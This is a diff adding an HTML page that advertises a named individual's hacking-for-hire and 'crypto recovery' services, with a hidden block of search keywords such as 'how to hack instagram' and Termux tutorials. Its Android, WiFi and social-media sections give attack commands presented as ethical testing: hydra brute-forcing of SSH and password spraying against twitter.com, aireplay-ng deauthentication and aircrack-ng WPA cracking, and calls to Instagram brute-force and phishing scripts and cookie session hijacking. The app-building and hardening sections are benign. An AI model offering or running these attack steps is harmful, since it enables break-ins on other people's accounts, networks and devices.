@@ -1,0 +1,1094 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Martin Peter Nandasava | Cyber Security Expert | Ethical Hacking</title>
+    <meta name="description" content="Martin Peter Nandasava - Cyber security expert offering ethical hacking services, device security, WiFi hacking, and crypto recovery. Contact for professional security solutions.">
+    <meta name="keywords" content="cyber security, ethical hacking, recover stolen assets, read WhatsApp messages, control devices remotely, hack WiFi, termux commands, crypto recovery, digital forensics, Martin Peter Nandasava">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0f172a, #1e293b, #2d3748);
+            color: #e2e8f0;
+            line-height: 1.7;
+            padding: 20px;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+        
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 10% 20%, rgba(56, 189, 248, 0.08) 0%, transparent 20%),
+                radial-gradient(circle at 90% 80%, rgba(74, 222, 128, 0.08) 0%, transparent 20%),
+                radial-gradient(circle at 50% 50%, rgba(139, 92, 246, 0.08) 0%, transparent 30%);
+            z-index: -1;
+        }
+        
+        .cyber-grid {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(56, 189, 248, 0.05) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(56, 189, 248, 0.05) 1px, transparent 1px);
+            background-size: 30px 30px;
+            z-index: -1;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            position: relative;
+        }
+        
+        /* SEO keywords hidden for search engines */
+        .seo-keywords {
+            position: absolute;
+            left: -9999px;
+            top: auto;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+        }
+        
+        header {
+            text-align: center;
+            padding: 40px 20px;
+            background: rgba(15, 23, 42, 0.95);
+            border-radius: 20px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(56, 189, 248, 0.3);
+            backdrop-filter: blur(5px);
+        }
+        
+        header::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(90deg, #38bdf8, #4ade80, #8b5cf6);
+        }
+        
+        .profile-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 25px;
+        }
+        
+        .profile-img {
+            width: 180px;
+            height: 180px;
+            border-radius: 50%;
+            border: 5px solid #38bdf8;
+            overflow: hidden;
+            box-shadow: 0 5px 20px rgba(56, 189, 248, 0.4);
+            background: linear-gradient(45deg, #1e40af, #1e3a8a);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 3rem;
+            position: relative;
+        }
+        
+        .profile-img::after {
+            content: "";
+            position: absolute;
+            top: -5px;
+            left: -5px;
+            right: -5px;
+            bottom: -5px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #38bdf8, #4ade80, #8b5cf6, #38bdf8);
+            background-size: 400% 400%;
+            z-index: -1;
+            animation: gradientRotate 8s ease infinite;
+        }
+        
+        .profile-info h1 {
+            font-size: 2.8rem;
+            margin-bottom: 10px;
+            background: linear-gradient(to right, #38bdf8, #4ade80);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .profile-info h2 {
+            font-size: 1.5rem;
+            color: #4ade80;
+            margin-bottom: 15px;
+        }
+        
+        .profile-info p {
+            max-width: 700px;
+            font-size: 1.1rem;
+            color: #cbd5e1;
+        }
+        
+        .course-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(500px, 1fr));
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+        
+        .section {
+            background: rgba(15, 23, 42, 0.95);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(56, 189, 248, 0.2);
+            transition: all 0.3s ease;
+            backdrop-filter: blur(5px);
+        }
+        
+        .section:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 30px rgba(56, 189, 248, 0.2);
+            border-color: rgba(74, 222, 128, 0.4);
+        }
+        
+        .section h3 {
+            font-size: 1.8rem;
+            color: #38bdf8;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #4ade80;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .section h4 {
+            color: #4ade80;
+            margin: 20px 0 15px;
+            font-size: 1.4rem;
+        }
+        
+        .command-box {
+            background: rgba(30, 41, 59, 0.8);
+            border-left: 4px solid #38bdf8;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 0 12px 12px 0;
+            font-family: 'Courier New', Courier, monospace;
+            overflow-x: auto;
+            position: relative;
+        }
+        
+        .command-box::before {
+            content: "$";
+            position: absolute;
+            left: 10px;
+            top: 20px;
+            color: #38bdf8;
+            font-weight: bold;
+        }
+        
+        .command-box code {
+            color: #4ade80;
+            font-size: 1.1rem;
+            display: block;
+            white-space: pre;
+            margin-left: 20px;
+            line-height: 1.6;
+        }
+        
+        .command-box .comment {
+            color: #94a3b8;
+            font-style: italic;
+        }
+        
+        .warning {
+            background: rgba(245, 158, 11, 0.15);
+            border-left: 4px solid #f59e0b;
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 0 12px 12px 0;
+        }
+        
+        .warning h4 {
+            color: #f59e0b;
+            margin-top: 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1.3rem;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 40px 30px;
+            background: rgba(15, 23, 42, 0.95);
+            border-radius: 20px;
+            margin-top: 40px;
+            font-size: 1.1rem;
+            border: 1px solid rgba(56, 189, 248, 0.2);
+            backdrop-filter: blur(5px);
+        }
+        
+        .social-links {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            margin: 20px 0;
+        }
+        
+        .social-links a {
+            color: #38bdf8;
+            font-size: 2rem;
+            transition: all 0.3s ease;
+        }
+        
+        .social-links a:hover {
+            color: #4ade80;
+            transform: translateY(-5px) scale(1.1);
+        }
+        
+        .contact-info {
+            margin: 25px 0;
+            padding: 20px;
+            background: rgba(30, 41, 59, 0.6);
+            border-radius: 15px;
+            display: inline-block;
+        }
+        
+        .contact-info p {
+            margin: 15px 0;
+            font-size: 1.2rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .contact-info a {
+            color: #38bdf8;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        
+        .contact-info a:hover {
+            color: #4ade80;
+            text-decoration: underline;
+        }
+        
+        .btn {
+            display: inline-block;
+            background: linear-gradient(to right, #38bdf8, #4ade80);
+            color: #0f172a;
+            padding: 12px 30px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: bold;
+            margin: 20px 0;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(56, 189, 248, 0.3);
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(56, 189, 248, 0.5);
+        }
+        
+        @media (max-width: 768px) {
+            .course-content {
+                grid-template-columns: 1fr;
+            }
+            
+            .profile-info h1 {
+                font-size: 2.2rem;
+            }
+        }
+        
+        .process-steps {
+            counter-reset: step;
+            margin: 30px 0;
+        }
+        
+        .step {
+            position: relative;
+            padding-left: 50px;
+            margin-bottom: 35px;
+            border-left: 2px solid rgba(56, 189, 248, 0.3);
+            padding-bottom: 25px;
+        }
+        
+        .step:last-child {
+            border-left: none;
+            padding-bottom: 0;
+        }
+        
+        .step::before {
+            counter-increment: step;
+            content: counter(step);
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 40px;
+            height: 40px;
+            background: #38bdf8;
+            color: #0f172a;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 1.3rem;
+            transform: translateX(-21px);
+            border: 3px solid rgba(15, 23, 42, 0.95);
+            box-shadow: 0 0 0 3px #38bdf8;
+        }
+        
+        .step h4 {
+            margin-bottom: 15px;
+            color: #38bdf8;
+            font-size: 1.4rem;
+        }
+        
+        .step p {
+            margin-bottom: 20px;
+            color: #cbd5e1;
+            line-height: 1.7;
+        }
+        
+        .terminal-header {
+            background: #1e293b;
+            padding: 12px 20px;
+            border-radius: 12px 12px 0 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-family: 'Courier New', Courier, monospace;
+            font-weight: 500;
+        }
+        
+        .terminal-dot {
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+        }
+        
+        .dot-red { background: #ef4444; }
+        .dot-yellow { background: #f59e0b; }
+        .dot-green { background: #10b981; }
+        
+        .terminal-body {
+            background: rgba(30, 41, 59, 0.8);
+            border-radius: 0 0 12px 12px;
+            padding: 20px;
+            font-family: 'Courier New', Courier, monospace;
+            overflow-x: auto;
+        }
+        
+        .terminal-code {
+            color: #4ade80;
+            line-height: 1.7;
+        }
+        
+        .service-cards {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin: 30px 0;
+        }
+        
+        .service-card {
+            background: rgba(30, 41, 59, 0.8);
+            border-radius: 15px;
+            padding: 25px;
+            text-align: center;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(56, 189, 248, 0.2);
+        }
+        
+        .service-card:hover {
+            transform: translateY(-10px);
+            border-color: rgba(74, 222, 128, 0.4);
+            box-shadow: 0 10px 25px rgba(56, 189, 248, 0.2);
+        }
+        
+        .service-card i {
+            font-size: 3rem;
+            color: #38bdf8;
+            margin-bottom: 20px;
+        }
+        
+        .service-card h4 {
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+            color: #4ade80;
+        }
+        
+        .service-card p {
+            color: #cbd5e1;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes gradientRotate {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        .glow {
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+        
+        @keyframes glow {
+            from { box-shadow: 0 0 5px rgba(56, 189, 248, 0.5); }
+            to { box-shadow: 0 0 20px rgba(56, 189, 248, 0.8), 0 0 30px rgba(74, 222, 128, 0.6); }
+        }
+        
+        .contact-form {
+            max-width: 600px;
+            margin: 40px auto;
+            padding: 30px;
+            background: rgba(30, 41, 59, 0.8);
+            border-radius: 20px;
+            border: 1px solid rgba(56, 189, 248, 0.3);
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 10px;
+            color: #38bdf8;
+            font-weight: 500;
+        }
+        
+        .form-group input,
+        .form-group textarea,
+        .form-group select {
+            width: 100%;
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid #334155;
+            background: rgba(15, 23, 42, 0.7);
+            color: #e2e8f0;
+            font-size: 1rem;
+        }
+        
+        .form-group textarea {
+            min-height: 150px;
+        }
+        
+        .form-group input:focus,
+        .form-group textarea:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: #38bdf8;
+            box-shadow: 0 0 0 3px rgba(56, 189, 248, 0.2);
+        }
+        
+        .crypto-badge {
+            display: inline-block;
+            background: rgba(56, 189, 248, 0.15);
+            color: #38bdf8;
+            padding: 8px 15px;
+            border-radius: 30px;
+            margin: 5px;
+            font-size: 0.9rem;
+            border: 1px solid rgba(56, 189, 248, 0.3);
+        }
+        
+        .code-block {
+            background: #1e293b;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow-x: auto;
+        }
+        
+        .code-block pre {
+            color: #4ade80;
+            font-family: 'Courier New', Courier, monospace;
+            line-height: 1.6;
+        }
+        
+        .code-block .comment {
+            color: #94a3b8;
+            font-style: italic;
+        }
+    </style>
+</head>
+<body>
+    <!-- SEO Keywords for search engines -->
+    <div class="seo-keywords">
+        how to read WhatsApp messages, recover stolen assets, control devices remotely, 
+        hack WiFi password, termux hacking commands, crypto recovery services, 
+        ethical hacking services, digital forensics expert, Martin Peter Nandasava contact, 
+        how to hack anything, cyber security solutions, phone hacking prevention, 
+        cryptocurrency security, blockchain forensics, ethical device control, 
+        how to hack android, how to secure android, how to hack instagram, 
+        how to hack twitter, how to create android apps without android studio, 
+        recover seed phrases, remote control devices
+    </div>
+    
+    <div class="cyber-grid"></div>
+    <div class="container">
+        <header>
+            <div class="profile-container">
+                <div class="profile-img">
+                    <i class="fas fa-user-secret"></i>
+                </div>
+                <div class="profile-info">
+                    <h1>Martin Peter Nandasava</h1>
+                    <h2>Cyber Security Expert & Ethical Hacking Consultant</h2>
+                    <p>Providing professional security solutions, digital forensics, and ethical hacking services worldwide</p>
+                    
+                    <div class="contact-info">
+                        <p>
+                            <i class="fab fa-whatsapp"></i> 
+                            <a href="https://wa.me/254740830343">+254 740 830343</a>
+                        </p>
+                        <p>
+                            <i class="fas fa-phone"></i> 
+                            <a href="tel:+254740830343">+254 740 830343</a>
+                        </p>
+                        <p>
+                            <i class="fas fa-envelope"></i> 
+                            <a href="mailto:martinnandasava@gmail.com">martinnandasava@gmail.com</a>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </header>
+        
+        <div class="service-cards">
+            <div class="service-card glow">
+                <i class="fab fa-android"></i>
+                <h4>Android Security</h4>
+                <p>Learn to secure Android devices and ethical penetration testing techniques</p>
+                <a href="#android" class="btn">Learn More</a>
+            </div>
+            
+            <div class="service-card glow">
+                <i class="fas fa-wifi"></i>
+                <h4>WiFi Hacking & Security</h4>
+                <p>Master WiFi penetration testing and network security techniques</p>
+                <a href="#wifi" class="btn">Learn More</a>
+            </div>
+            
+            <div class="service-card glow">
+                <i class="fas fa-key"></i>
+                <h4>Crypto Recovery</h4>
+                <p>Recover lost cryptocurrency and seed phrases with advanced techniques</p>
+                <a href="#crypto" class="btn">Learn More</a>
+            </div>
+        </div>
+        
+        <div class="course-content">
+            <!-- Android Hacking & Security Section -->
+            <div class="section" id="android">
+                <h3><i class="fab fa-android"></i> Android Hacking & Security</h3>
+                
+                <div class="process-steps">
+                    <div class="step">
+                        <h4>Step 1: Android Device Hacking</h4>
+                        <p>Termux commands for ethical Android penetration testing:</p>
+                        <div class="command-box">
+                            <code># Install Termux tools
+pkg update && pkg upgrade
+pkg install python nmap hydra sqlmap
+
+# Scan device network
+nmap -sV 192.168.1.0/24
+
+# Brute force SSH access
+hydra -l root -P passwords.txt ssh://192.168.1.1
+
+# Install Metasploit framework
+pkg install unstable-repo
+pkg install metasploit
+
+# Run Metasploit console
+msfconsole</code>
+                        </div>
+                    </div>
+                    
+                    <div class="step">
+                        <h4>Step 2: Securing Android Devices</h4>
+                        <p>Essential security practices:</p>
+                        <div class="command-box">
+                            <code># Enable full device encryption
+Settings > Security > Encrypt device
+
+# Verify app signatures
+pkg install apksigner
+apksigner verify app.apk
+
+# Check for root access
+su -c 'echo "Device rooted?"'
+
+# Monitor network traffic
+tcpdump -i any -s 0 -w capture.pcap</code>
+                        </div>
+                        <p>Additional security measures: Use app lock, disable USB debugging, install security patches immediately.</p>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- WiFi Hacking Section -->
+            <div class="section" id="wifi">
+                <h3><i class="fas fa-wifi"></i> WiFi Hacking & Security</h3>
+                
+                <div class="process-steps">
+                    <div class="step">
+                        <h4>Step 1: WiFi Penetration Testing</h4>
+                        <p>Termux commands for WiFi hacking:</p>
+                        <div class="command-box">
+                            <code># Enable monitor mode
+termux-wifi-enable
+su
+airmon-ng start wlan0
+
+# Scan for networks
+airodump-ng wlan0mon
+
+# Target a specific network
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+# Deauthenticate clients
+aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# Crack WiFi password
+aircrack-ng -w rockyou.txt capture-01.cap</code>
+                        </div>
+                    </div>
+                    
+                    <div class="step">
+                        <h4>Step 2: Securing WiFi Networks</h4>
+                        <p>Essential security practices:</p>
+                        <div class="command-box">
+                            <code># Use WPA3 encryption
+# Change default router credentials
+# Disable WPS feature
+# Enable MAC address filtering
+# Create guest network for visitors
+# Regularly update router firmware</code>
+                        </div>
+                        <p>Monitor your network with: <code>arp-scan -l</code> and <code>nmap -sV [your IP range]</code></p>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Social Media Hacking Section -->
+            <div class="section">
+                <h3><i class="fas fa-hashtag"></i> Social Media Security</h3>
+                
+                <div class="process-steps">
+                    <div class="step">
+                        <h4>Instagram Security Testing</h4>
+                        <p>Termux commands for Instagram penetration testing:</p>
+                        <div class="command-box">
+                            <code># Install required tools
+pkg install python git
+git clone https://github.com/instaloader/instaloader
+cd instaloader
+pip install .
+
+# Brute force protection bypass
+python3 instagram_brute.py -u username -w wordlist.txt
+
+# Session hijacking
+curl -H "Cookie: sessionid=IG_SESSION" https://www.instagram.com/
+
+# Phishing simulation
+python3 instagram-phishing.py</code>
+                        </div>
+                    </div>
+                    
+                    <div class="step">
+                        <h4>Twitter Security Testing</h4>
+                        <p>Termux commands for Twitter penetration testing:</p>
+                        <div class="command-box">
+                            <code># Install Twitter tools
+pkg install python
+pip install tweepy python-twitter
+
+# Password spraying attack
+hydra -L users.txt -P passwords.txt twitter.com http-post-form \
+"/sessions:username=^USER^&password=^PASS^:F=error"
+
+# API key extraction
+# Analyze app traffic with:
+tcpdump -i any -s 0 -w twitter.pcap
+
+# Account enumeration
+curl -s "https://twitter.com/users/username_available?username=testuser"</code>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Crypto Recovery Section -->
+            <div class="section" id="crypto">
+                <h3><i class="fas fa-coins"></i> Crypto Recovery Techniques</h3>
+                
+                <div class="process-steps">
+                    <div class="step">
+                        <h4>Step 1: Seed Phrase Recovery</h4>
+                        <p>Python script to recover partial seed phrases:</p>
+                        <div class="code-block">
+                            <pre>import itertools
+
+# Partial seed phrase with ? for unknown words
+partial_seed = ["word1", "word2", "?", "word4", "?", "word6", "?", "word8", "word9", "?", "word11", "word12"]
+
+# List of possible words (simplified)
+wordlist = ["apple", "banana", "cherry", "date", "elderberry", "fig", "grape"]
+
+# Find positions of unknown words
+unknown_positions = [i for i, word in enumerate(partial_seed) if word == "?"]
+
+# Generate combinations for unknown positions
+for combo in itertools.product(wordlist, repeat=len(unknown_positions)):
+    recovered_seed = partial_seed.copy()
+    for pos, word in zip(unknown_positions, combo):
+        recovered_seed[pos] = word
+    
+    # Check if seed is valid (pseudo-code)
+    if is_valid_seed(recovered_seed):
+        print("Recovered seed:", " ".join(recovered_seed))
+        break</pre>
+                        </div>
+                        <p>This script attempts to recover seed phrases with missing words by trying combinations from a wordlist.</p>
+                    </div>
+                    
+                    <div class="step">
+                        <h4>Step 2: Crypto Asset Recovery</h4>
+                        <p>Methods to recover stolen cryptocurrency:</p>
+                        <div class="command-box">
+                            <code># Blockchain analysis
+# Use blockchain explorers: blockchain.com, etherscan.io
+# Trace transaction history
+
+# Identify wallet addresses
+# Cluster addresses using heuristic algorithms
+
+# Contact exchanges
+# Report stolen funds to exchanges for possible freezing
+
+# Work with law enforcement
+# Provide transaction details to authorities</code>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Remote Device Control Section -->
+            <div class="section">
+                <h3><i class="fas fa-laptop-code"></i> Remote Device Control</h3>
+                
+                <div class="process-steps">
+                    <div class="step">
+                        <h4>Ethical Remote Control</h4>
+                        <p>Termux commands for remote device management:</p>
+                        <div class="command-box">
+                            <code># Install SSH server
+pkg install openssh
+sshd
+
+# Connect to device (from another machine)
+ssh username@device-ip -p 8022
+
+# Install VNC server
+pkg install tigervnc
+vncserver
+
+# Access device screen
+# Use VNC client on your computer
+
+# Remote file transfer
+scp -P 8022 file.txt username@device-ip:/sdcard/
+
+# Remote command execution
+ssh username@device-ip -p 8022 'command'</code>
+                        </div>
+                    </div>
+                    
+                    <div class="step">
+                        <h4>Security Considerations</h4>
+                        <p>When enabling remote access:</p>
+                        <div class="command-box">
+                            <code># Always use strong passwords
+# Change default SSH port
+# Use key-based authentication
+# Enable firewall
+pkg install iptables
+iptables -A INPUT -p tcp --dport 8022 -j ACCEPT
+
+# Monitor connections
+netstat -tunap | grep :8022
+
+# Disable services when not in use
+pkill sshd</code>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Android App Development Section -->
+            <div class="section">
+                <h3><i class="fas fa-mobile-alt"></i> Create Android Apps Without Android Studio</h3>
+                
+                <div class="process-steps">
+                    <div class="step">
+                        <h4>Step 1: Setup Development Environment</h4>
+                        <p>Install required tools in Termux:</p>
+                        <div class="command-box">
+                            <code># Install Python and essential packages
+pkg install python clang git
+pip install buildozer
+
+# Install Android SDK components
+pkg install unstable-repo
+pkg install android-sdk
+
+# Set environment variables
+export ANDROIDSDK="$HOME/android-sdk"
+export ANDROIDNDK="$HOME/android-ndk"
+export PATH="$PATH:$ANDROIDSDK/tools:$ANDROIDSDK/platform-tools"
+
+# Install build tools
+sdkmanager "platform-tools" "platforms;android-30" "build-tools;30.0.3"</code>
+                        </div>
+                    </div>
+                    
+                    <div class="step">
+                        <h4>Step 2: Create and Build Your App</h4>
+                        <p>Develop and build Android apps using Python:</p>
+                        <div class="command-box">
+                            <code># Create a simple Kivy app
+echo '
+import kivy
+kivy.require("2.0.0")
+from kivy.app import App
+from kivy.uix.label import Label
+
+class MyApp(App):
+    def build(self):
+        return Label(text="Hello World")
+        
+MyApp().run()
+' > main.py
+
+# Create buildozer spec file
+buildozer init
+
+# Edit buildozer.spec to configure app
+# Set title, package.name, requirements, etc.
+
+# Build the APK
+buildozer -v android debug
+
+# Install and run on device
+adb install bin/*.apk</code>
+                        </div>
+                    </div>
+                    
+                    <div class="step">
+                        <h4>Step 3: Advanced App Development</h4>
+                        <p>Additional development options:</p>
+                        <div class="command-box">
+                            <code># Use Flask for web-based apps
+pip install flask
+
+# Create web view app
+echo '
+from flask import Flask, render_template
+app = Flask(__name__)
+
+@app.route("/")
+def home():
+    return render_template("index.html")
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=8080)
+' > app.py
+
+# Use Termux:API for device features
+pkg install termux-api
+termux-battery-status
+termux-camera-photo
+
+# Create hybrid apps with WebView
+# Use python-for-android to build</code>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="contact-form" id="contact">
+            <h3 style="text-align: center; margin-bottom: 30px; color: #38bdf8;">
+                <i class="fas fa-envelope"></i> Contact Martin Peter Nandasava
+            </h3>
+            
+            <form>
+                <div class="form-group">
+                    <label for="name">Full Name</label>
+                    <input type="text" id="name" placeholder="Enter your full name">
+                </div>
+                
+                <div class="form-group">
+                    <label for="email">Email Address</label>
+                    <input type="email" id="email" placeholder="Enter your email">
+                </div>
+                
+                <div class="form-group">
+                    <label for="phone">Phone/WhatsApp</label>
+                    <input type="tel" id="phone" placeholder="Enter your phone/WhatsApp">
+                </div>
+                
+                <div class="form-group">
+                    <label for="service">Service Required</label>
+                    <select id="service">
+                        <option value="">Select a service</option>
+                        <option value="android">Android Security</option>
+                        <option value="wifi">WiFi Security</option>
+                        <option value="crypto">Crypto Recovery</option>
+                        <option value="social">Social Media Security</option>
+                        <option value="remote">Remote Device Control</option>
+                        <option value="app">App Development</option>
+                        <option value="other">Other</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label for="message">Message</label>
+                    <textarea id="message" placeholder="Describe your requirements"></textarea>
+                </div>
+                
+                <button type="submit" class="btn" style="width: 100%;">Send Message</button>
+            </form>
+        </div>
+        
+        <div class="contact-info">
+            <p>
+                <i class="fab fa-whatsapp"></i> 
+                <a href="https://wa.me/254740830343">WhatsApp: +254 740 830343</a>
+            </p>
+            <p>
+                <i class="fas fa-phone"></i> 
+                Phone: <a href="tel:+254740830343">+254 740 830343</a>
+            </p>
+            <p>
+                <i class="fas fa-envelope"></i> 
+                Email: <a href="mailto:martinnandasava@gmail.com">martinnandasava@gmail.com</a>
+            </p>
+            <p>
+                <i class="fas fa-globe"></i> Available worldwide for consultations
+            </p>
+            
+            <div style="margin-top: 20px;">
+                <span class="crypto-badge">Bitcoin Recovery</span>
+                <span class="crypto-badge">Ethereum Forensics</span>
+                <span class="crypto-badge">Blockchain Analysis</span>
+                <span class="crypto-badge">Crypto Security</span>
+            </div>
+        </div>
+        
+        <footer>
+            <div class="social-links">
+                <a href="#"><i class="fab fa-twitter"></i></a>
+                <a href="#"><i class="fab fa-linkedin"></i></a>
+                <a href="#"><i class="fab fa-github"></i></a>
+                <a href="#"><i class="fab fa-youtube"></i></a>
+            </div>
+            
+            <p>&copy; 2023 Martin Peter Nandasava | Cyber Security Expert</p>
+            <p style="margin-top: 15px;">Providing ethical hacking services and security solutions worldwide</p>
+            
+            <div class="contact-info" style="margin-top: 25px;">
+                <p>24/7 Support: <a href="tel:+254740830343">+254 740 830343</a></p>
+                <p>Email: <a href="mailto:martinnandasava@gmail.com">martinnandasava@gmail.com</a></p>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // Form submission
+        document.querySelector('form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            alert('Thank you for your message! Martin will contact you shortly.');
+            this.reset();
+        });
+        
+        // Service card animations
+        const serviceCards = document.querySelectorAll('.service-card');
+        serviceCards.forEach(card => {
+            card.addEventListener('mouseenter', () => {
+                card.classList.add('glow');
+            });
+            
+            card.addEventListener('mouseleave', () => {
+                card.classList.remove('glow');
+            });
+        });
+        
+        // Animate steps on scroll
+        const steps = document.querySelectorAll('.step');
+        
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.style.opacity = 1;
+                    entry.target.style.transform = 'translateY(0)';
+                }
+            });
+        }, { threshold: 0.1 });
+        
+        steps.forEach(step => {
+            step.style.opacity = 0;
+            step.style.transform = 'translateY(20px)';
+            step.style.transition = 'opacity 0.5s, transform 0.5s';
+            observer.observe(step);
+        });
+        
+        // Terminal animation
+        const terminalCodes = document.querySelectorAll('.terminal-code');
+        terminalCodes.forEach(code => {
+            const text = code.textContent;
+            code.textContent = '';
+            let i = 0;
+            
+            function typeWriter() {
+                if (i < text.length) {
+                    code.textContent += text.charAt(i);
+                    i++;
+                    setTimeout(typeWriter, 20);
+                }
+            }
+            
+            setTimeout(typeWriter, 500);
+        });
+    </script>
+</body>
+</html>
